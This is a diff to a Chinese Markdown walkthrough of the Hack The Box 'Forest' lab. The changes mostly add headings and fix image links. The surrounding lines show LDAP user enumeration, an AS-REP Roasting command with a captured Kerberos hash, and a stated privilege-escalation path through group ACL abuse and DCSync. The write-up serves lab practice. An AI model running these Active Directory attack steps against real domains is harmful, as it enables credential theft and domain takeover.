@@ -4,7 +4,9 @@ pagination_prev: null
 pagination_next: null
 ---
 
-# 端口扫描
+## 信息收集
+
+### 端口扫描
 ### 全端口扫描
 ~~~
 ┌──(kali㉿kali)-[~/Forest]
@@ -164,6 +166,7 @@ Nmap done: 1 IP address (1 host up) scanned in 190.28 seconds
 
 搜集到域名htb.local
 
+### 用户枚举
 对ldap进行用户名枚举
 ~~~
 ┌──(myvenv)─(kali㉿kali)-[~/Forest/windapsearch]                                   └─$ python windapsearch.py -d htb.local --dc-ip 10.10.10.161 -U                    [+] No username provided. Will try anonymous bind.                                 [+] Using Domain Controller at: 10.10.10.161                                       [+] Getting defaultNamingContext from Root DSE                                     [+]     Found: DC=htb,DC=local                                                     [+] Attempting bind                                                                [+]     ...success! Binded as:                                                     [+]      None                                                                      [+] Enumerating all AD users                                                       [+]     Found 29 users:                                                            cn: Guest                                                                          cn: DefaultAccount                                                                
@@ -296,6 +299,10 @@ $krb5asrep$18$svc-alfresco@HTB.LOCAL:5395e735bf254c0ecb4d5a1fe81bb161$bba4b9ee1a
                                                                              
 ~~~
 
+## 漏洞利用
+
+### AS-REP Roasting (初始访问)
+
 ~~~
 ┌──(myvenv)─(kali㉿kali)-[~/Forest]
 └─$ python3 GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/svc-alfresco                   
@@ -393,6 +400,10 @@ Info: Establishing connection to remote endpoint
 htb\svc-alfresco          
 ~~~
 
+## 权限提升
+
+### BloodHound 分析与 ACL 提权 (DCSync)
+
 利用bloodhound采集器搜集信息
 
 ~~~
@@ -426,11 +437,11 @@ INFO: Compressing output into 20250101081501_bloodhound.zip
 
 发现用户svc-alfresco属于ACCOUNT OPERATORS组
 
-![](Pasted%20image%2020250110164942.png)
+![](Pasted_image_20250110164942.png)
 
 ACCOUNT OPERATORS对组EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL有GenericAll权限
 
-![](Pasted%20image%2020250110170205.png)
+![](Pasted_image_20250110170205.png)
 
 提权的路径为添加一个新用户到EXCHANGE WINDOWS PERMISSIONS组，然后利用DCSync转储hash，实现提权
 
